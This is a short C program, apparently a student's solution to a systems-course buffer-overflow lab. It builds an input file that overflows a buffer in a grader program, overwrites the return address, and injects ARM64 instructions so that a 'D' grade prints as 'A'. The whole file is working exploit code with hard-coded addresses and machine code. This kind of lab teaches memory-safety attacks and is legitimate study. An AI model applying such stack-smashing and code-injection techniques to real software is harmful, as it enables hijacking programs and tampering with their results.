/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Maxwell Lin and Melody Choi                                */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/*--------------------------------------------------------------------*/

/* Creates a string capable of causes the grader.c program to generate 
   output whose format is indistinguishable from normal output, with 
   the exception that the grade 'D' is changed to 'A'.

   Outputs to file dataA (if file does not exist, creates it). */

int main(void)
{
   FILE *psFile;
   unsigned long ulData1;
   unsigned int uiData2;
   unsigned int uiData3;

   ulData1 = 0x42006c; /* address to the instructions below; */
   uiData2 = 0x52800821; /* "mov w1, #0x41" in machine language */
   uiData3 = 0x17FF81FB; /* "b 0x40085c" in machine language */

   psFile = fopen("dataA", "w");

   /* buf[0-19] */
   fprintf(psFile, "Maxwell and Melody");
   putc('\0', psFile);
   putc('\0', psFile);
   /* buf[20-23] */
   fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
   /* buf[24-27] */
   fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
   /* buf[28-47] */
   fprintf(psFile, "fillerfillerfillerfi");
   /* buf[48-55] (main return address) */
   fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
   /* buf[56] (newline to end attack) */
   putc('\n', psFile);
   return 0;

   /* The overwritten return value redirects the return of getName
      To the point in bss where injected commands are stored, then: 
      
      >runs the command "mov w1 'A'"
      >branches to the code just past "mov w1 'B'"
      
      thus setting grade = 'A'. */
}